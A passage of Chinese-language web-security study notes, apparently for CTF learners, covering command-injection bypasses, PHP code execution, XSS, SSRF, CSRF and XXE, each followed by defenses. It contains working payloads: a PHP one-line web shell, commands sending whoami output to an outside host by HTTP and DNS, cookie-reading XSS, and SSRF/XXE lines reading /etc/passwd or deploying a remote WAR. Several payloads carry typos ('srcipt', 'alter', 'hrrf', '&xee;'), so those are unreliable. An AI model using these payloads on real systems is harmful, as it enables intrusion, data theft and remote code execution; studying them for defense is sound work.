<li>绕过：<br><code>/b??/?c 3232258951 -e /???/b??h</code>（-e 默认关，需要改版本）</li>
</ul>
</li>
<li><p>base64</p>
<blockquote>
<p>原理：先编码再解码</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">`<span class="built_in">echo</span> <span class="string">&quot;aWQ=&quot;</span>|<span class="built_in">base64</span> -d`</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="4-3-其他绕过"><a href="#4-3-其他绕过" class="headerlink" title="4.3 其他绕过"></a>4.3 其他绕过</h4><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/BugScanTeam/DNSLog">DNSLog下载</a></p>
</blockquote>
<ul>
<li><p>expr &amp; awk</p>
<blockquote>
<p>原理：从其他文件中获得字符并进行命令构造</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">expr</span> substr $(awk NR=1 ctfs-wiki) 1 1</span><br></pre></td></tr></table></figure>
</li>
<li><p>无回显命令执行</p>
<blockquote>
<p>无法反弹 shell 可以 DNS 管道解析获得信息。</p>
</blockquote>
<ul>
<li><p>Linux 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl test.ctfs-wiki.com/ `<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure>
</li>
<li><p>Linux 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping -c 1 whoami.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows 计算机名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F %x <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> start http://test.ctfs-wiki.com/%x</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows 用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /F <span class="string">&quot;delims=\ tokens=2&quot;</span> %i <span class="keyword">in</span> (<span class="string">&#x27;whoami&#x27;</span>) <span class="keyword">do</span> ping -n 1 %i.test.ctfs-wiki.com</span><br></pre></td></tr></table></figure>
</li>
<li><p>网站用户名</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&quot;http://test.ctfs-wiki.com/?&quot;</span>`<span class="built_in">whoami</span>`</span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
</ul>
<h3 id="5-防护"><a href="#5-防护" class="headerlink" title="5 防护"></a>5 防护</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/116902085">绕过防护</a></p>
</blockquote>
<ol>
<li>PHP配置文件 disable_functions 禁用敏感函数。</li>
<li><code>string escapeshellarg(string $arg)</code>：给字符串加一个单引号，存在的单引号会被转义。</li>
<li><code>string escapeshellcmd(string $command)</code>：特殊字符都会被转义。</li>
</ol>
<hr>
<h2 id="七、代码执行漏洞"><a href="#七、代码执行漏洞" class="headerlink" title="七、代码执行漏洞"></a>七、代码执行漏洞</h2><h3 id="1-普通函数"><a href="#1-普通函数" class="headerlink" title="1 普通函数"></a>1 普通函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 把字符串作为php代码执行</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 检查一个断言是否为FALSE</span></span><br><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">assert</span>(<span class="keyword">mixed</span> <span class="variable">$assertion</span>[,<span class="built_in">Throwable</span> <span class="variable">$exception</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span>[,<span class="keyword">mixed</span> <span class="variable">$parameter</span> ...]]);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 把第一个参数作为回调函数调用，之后跟参数数组</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$param_arr</span>);</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>],<span class="variable">$_POST</span>[<span class="string">&#x27;arg&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line">fun=system&amp;arg=id <span class="comment"># post请求</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># 根据参数创建匿名函数，并为该匿名函数返回唯一名称</span></span><br><span class="line"><span class="keyword">string</span> <span class="title function_ invoke__">create_function</span>(<span class="keyword">string</span> <span class="variable">$args</span>,<span class="keyword">string</span> <span class="variable">$code</span>);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="variable">$code</span>=<span class="string">&#x27;echo&#x27;</span>.<span class="variable">$func</span>.<span class="string">&#x27;test&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$func&#x27;</span>,<span class="variable">$code</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 等价于下列代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">fucntion <span class="title function_ invoke__">func</span>(<span class="variable">$func</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;test&quot;</span>.<span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?id=<span class="number">1</span>;&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/* # 前面需要/*，这是注释保证后面代码颜色*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 为数组每个元素应用回调函数</span></span><br><span class="line"><span class="keyword">array</span> <span class="title function_ invoke__">array_map</span>(<span class="keyword">callable</span> <span class="variable">$callback</span>,<span class="keyword">array</span> <span class="variable">$array1</span>[,<span class="keyword">array</span> <span class="variable">$array2</span>]);</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$argv</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$array</span>[<span class="number">0</span>]=<span class="variable">$argv</span>;</span><br><span class="line"><span class="title function_ invoke__">array_map</span>(<span class="variable">$func</span>,<span class="variable">$array</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 使用代码</span></span><br><span class="line">?func=system&amp;argv=id;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行一个正则表达式的搜索和替换。在subject中正则找到pattern中的内容，用replacement替代</span></span><br><span class="line"><span class="keyword">mixed</span> <span class="title function_ invoke__">preg_replace</span>(<span class="keyword">mixed</span> <span class="variable">$pattern</span>,<span class="keyword">mixed</span> <span class="variable">$replacement</span>,<span class="keyword">mixed</span> <span class="variable">$subject</span>[,<span class="keyword">int</span> <span class="variable">$limit</span>=-<span class="number">1</span>[,<span class="keyword">int</span> &amp;<span class="variable">$count</span>]]);</span><br><span class="line"><span class="comment"># $pattern中以e结尾可以执行php</span></span><br></pre></td></tr></table></figure>
<h3 id="2-可变函数"><a href="#2-可变函数" class="headerlink" title="2 可变函数"></a>2 可变函数</h3><blockquote>
<p>变量名后有圆括号会被当成函数执行。</p>
</blockquote>
<hr>
<h2 id="八、XSS漏洞"><a href="#八、XSS漏洞" class="headerlink" title="八、XSS漏洞"></a>八、XSS漏洞</h2><h3 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1 反射型"></a>1 反射型</h3><blockquote>
<p>发给服务器后服务器执行了script脚本后再发回来，代码不存入服务器。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45488495/article/details/115793888">反射型XSS原理及实操</a></p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--执行代码--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span>&gt;</span>alter(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--获得cookie--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alter</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="2-存储型"><a href="#2-存储型" class="headerlink" title="2 存储型"></a>2 存储型</h3><blockquote>
<p>存在服务器。</p>
<p>发给服务器后服务器执行了script脚本后再发回来，代码存入服务器，之后用户访问都会执行该脚本。</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--篡改链接--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> links = <span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&quot;a&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; links.<span class="property">length</span>;i++)</span></span><br><span class="line"><span class="language-javascript">    links[i].<span class="property">href</span>=<span class="string">&quot;http://www.xxx.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3 DOM型"></a>3 DOM型</h3><blockquote>
<p>基于文档对象模型（Document Object Model）</p>
<p>前端漏洞，存在于script的DOM对象中的漏洞，不与服务器交互。</p>
<p><code>&lt;img src=1 onerror=alert(/ctfs/)/&gt;</code>：注入代码，找不到源会报错。</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 常见可能存在DOM的代码</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">writeln</span>()</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">domain</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">innerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">outerHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">insertAdjacentHTML</span></span><br><span class="line">&lt;someDOMElement&gt;.<span class="property">onevent</span></span><br></pre></td></tr></table></figure>
<h3 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4 绕过"></a>4 绕过</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--1.引号变成反引号--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">srcipt</span>&gt;</span>alter(`1`)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--2.双写绕过--&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">scscriptript</span>&gt;</span>alert(&quot;xss&quot;)<span class="tag">&lt;/<span class="name">scscriptript</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--3.编码绕过--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--编码可以是Unicode，URL，ASCII，进制，base64--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="title function_">atob</span>(base64))</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;<span class="symbol">&amp;#100;</span><span class="symbol">&amp;#100;</span>&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--4.伪协议绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">hrrf</span>=<span class="string">&quot;javascript:alert(document.cookie)&quot;</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--5.空格绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sc</span> <span class="attr">ript</span>&gt;</span>alert(&quot;xss&quot;)&lt;/s cript&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--6.script绕过--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;1&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">111</span>&#x27;);&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="5-防护-1"><a href="#5-防护-1" class="headerlink" title="5 防护"></a>5 防护</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转换字符为HTML字符编码。quotestyle：定义如何对单引号和双引号进行编码</span></span><br><span class="line"><span class="title function_ invoke__">htmlentities</span>(<span class="keyword">string</span>,[quotestyle,character-set]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预定义特殊字符转化成html实体。如：&amp;,&lt;,&gt;（默认不编码单引号）</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ENT_COMPAT：默认。仅编码双引号</span></span><br><span class="line"><span class="comment">ENT_QUOTES：编码单双引号</span></span><br><span class="line"><span class="comment">ENT_NOQUOTES：不编码任何引号</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">htmlspecialchars</span>(<span class="keyword">string</span>,ENT_QUOTES);</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="九、SSRF漏洞"><a href="#九、SSRF漏洞" class="headerlink" title="九、SSRF漏洞"></a>九、SSRF漏洞</h2><h3 id="1-利用"><a href="#1-利用" class="headerlink" title="1 利用"></a>1 利用</h3><blockquote>
<p>Server-Side Request Forge，服务端请求伪造。用于内网渗透。</p>
<p>原因：服务器可以访问网络中其他服务器，对url没有严格过滤。</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/112055947">Gopher</a></p>
</blockquote>
<ul>
<li>利用方式<ul>
<li>通过服务器获取内网主机、端口和 banner 信息</li>
<li>对内网的应用程序进行攻击，例如 Redis、JBoss等</li>
<li>利用 file:// 伪协议读取文件</li>
<li>可以攻击内网程序，造成缓冲区溢出</li>
</ul>
</li>
<li>易出现场景<ul>
<li>转码服务</li>
<li>在线翻译</li>
<li>分享，通过 url 地址分享文章</li>
<li>通过 url 地址加载或下载图片</li>
<li>图片、文章收藏功能</li>
<li>网站采集、网页抓取</li>
<li>远程加载头像</li>
<li>一切可以输入网址和 IP 的地方</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 敏感php函数</span></span><br><span class="line"><span class="comment"># 对传入的url进行请求并返回请求结果</span></span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(url);</span><br><span class="line"><span class="comment"># 把整个文件读入一个字符串中</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>(path[,include_path,context,start,max_length]);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用</span></span><br><span class="line"><span class="comment"># 端口检测（自连测端口），返回mysql数据库版本信息则是开启，没有返回或长时间不返回则是未开启</span></span><br><span class="line">?url = http:<span class="comment">//127.0.0.1:3306</span></span><br><span class="line"><span class="comment"># 读取文件</span></span><br><span class="line">?url = file:<span class="comment">///etc//passwd</span></span><br><span class="line">?file = file:<span class="comment">///c:/windows/win.ini</span></span><br><span class="line"><span class="comment"># 访问首页</span></span><br><span class="line">?url = gopher:<span class="comment">//127.0.0.1:80/_GET%20%2findex.php</span></span><br><span class="line"><span class="comment"># jmx控制台</span></span><br><span class="line">?url = http:<span class="comment">//ip:port/jmx-console/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># php为协议</span></span><br><span class="line">?url = ?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=ssrf.php</span></span><br></pre></td></tr></table></figure>
<h3 id="2-防护"><a href="#2-防护" class="headerlink" title="2 防护"></a>2 防护</h3><ol>
<li>过滤请求协议，只允许 http 或者 https 开头的协议。</li>
<li>严格限制访问的 IP 地址，只允许访问特定 IP 地址。</li>
<li>限制访问的端口，只允许访问特定的端口。</li>
<li>设置统一的错误信息，防止造成信息泄露。</li>
</ol>
<hr>
<h2 id="十、CSRF剖析"><a href="#十、CSRF剖析" class="headerlink" title="十、CSRF剖析"></a>十、CSRF剖析</h2><h3 id="1-利用-1"><a href="#1-利用-1" class="headerlink" title="1 利用"></a>1 利用</h3><blockquote>
<p>定义：借用户的权限完成攻击。</p>
<p>CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。</p>
</blockquote>
<h3 id="2-防护-1"><a href="#2-防护-1" class="headerlink" title="2 防护"></a>2 防护</h3><ol>
<li>验证HTTP Referer字段</li>
<li>Token验证</li>
<li>添加验证码</li>
</ol>
<hr>
<h2 id="十一、XXE漏洞"><a href="#十一、XXE漏洞" class="headerlink" title="十一、XXE漏洞"></a>十一、XXE漏洞</h2><blockquote>
<p>应用程序在解析XML时没有过滤外部实体的加载，导致加载了恶意的外部文件，造成执行命令、读取文件、扫描内网、攻击内网等危害</p>
<p>windows换行：回车（CR）+换行（LF）</p>
</blockquote>
<h3 id="1-XML基础"><a href="#1-XML基础" class="headerlink" title="1 XML基础"></a>1 XML基础</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明（定义了XML的版本和编码），必须写在第一行--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--version必选，encoding可选--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span> ?&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!DOCTYPE 根元素 [元素声明]--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--&lt;!ELEMENT 元素名 类型--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span> </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--外部文档引用--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--本地--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">SYSTEM</span> <span class="string">&quot;文件名&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;note.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--网络--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE 根元素 <span class="keyword">PUBLIC</span> “DTD名称” <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span> <span class="keyword">public</span> <span class="string">&quot;-/ctfs/dtd html 4.01/en&quot;</span> <span class="string">&quot;http://www.ctfs-wiki.com/note.dtd&quot;</span></span></span><br></pre></td></tr></table></figure>
<h3 id="2-XXE漏洞"><a href="#2-XXE漏洞" class="headerlink" title="2 XXE漏洞"></a>2 XXE漏洞</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT|LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello &#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--文件读取--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">creds</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">username</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">password</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xee;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>test<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网探测--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/read=convert.base64-encode/resource=index.php&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--内网应用攻击--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:8080/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.deployment:type=DeploymentScanner,flavor=URL&amp;methodIndex=7&amp;arg0=http://10.2.7.11/cmd.war&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文件读取，调用伪协议执行命令--&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;except://id&quot;</span>&gt;</span>]&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--xxe回显--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="string">&quot;xxe&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取系统文件--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/win.ini&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--读取源码--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--端口爆破--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;php://filter/convert.base64-encode/resource=flag.php&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span>&amp;xxe<span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span>  <span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span> ]&gt;</span>  <span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span>;<span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="3-防护"><a href="#3-防护" class="headerlink" title="3 防护"></a>3 防护</h3><ol>
<li><p>禁用外部实体</p>
<blockquote>
<p>代码中设置 <code>libxml_disable_entity_loader(true)</code></p>
</blockquote>
</li>
<li><p>过滤用户提交的XML数据</p>
<blockquote>
<p>过滤关键词为 <code>&lt;! DOCTYPE、&lt;! ENTITY、SYSTEM、PUBLIC</code></p>
</blockquote>
</li>
</ol>
<hr>
